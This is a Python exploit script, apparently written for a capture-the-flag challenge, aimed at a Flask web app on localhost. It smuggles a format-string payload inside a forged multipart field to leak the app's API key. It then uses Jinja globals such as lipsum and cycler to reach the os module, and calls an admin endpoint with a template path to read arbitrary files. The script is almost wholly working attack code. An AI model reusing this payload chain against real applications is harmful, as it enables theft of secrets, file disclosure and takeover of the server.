import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 关键发现：jinja_env.globals 包含 lipsum
    # lipsum 的 __globals__ 包含 os 模块！
    
    print("\n[*] Exploring lipsum.__globals__...")
    result = debug_format("{0.jinja_env.globals[lipsum].__globals__}")
    if result:
        print(f"lipsum.__globals__ keys visible: {result[:500]}...")
    
    # 尝试访问 lipsum.__globals__['os']
    print("\n[*] Trying lipsum.__globals__[os]...")
    result = debug_format("{0.jinja_env.globals[lipsum].__globals__[os]}")
    if result:
        print(f"Result: {result}")
    
    # 尝试访问 cycler 等
    print("\n[*] Trying cycler...")
    result = debug_format("{0.jinja_env.globals[cycler].__mro__}")
    if result:
        print(f"cycler.__mro__: {result}")
    
    # 检查 namespace
    print("\n[*] Trying namespace...")
    result = debug_format("{0.jinja_env.globals[namespace]}")
    if result:
        print(f"namespace: {result}")
    
    # 尝试 __init__
    result = debug_format("{0.jinja_env.globals[cycler].__init__}")
    if result:
        print(f"cycler.__init__: {result}")
    
    result = debug_format("{0.jinja_env.globals[cycler].__init__.__globals__}")
    if result:
        print(f"cycler.__init__.__globals__: {result[:500]}...")
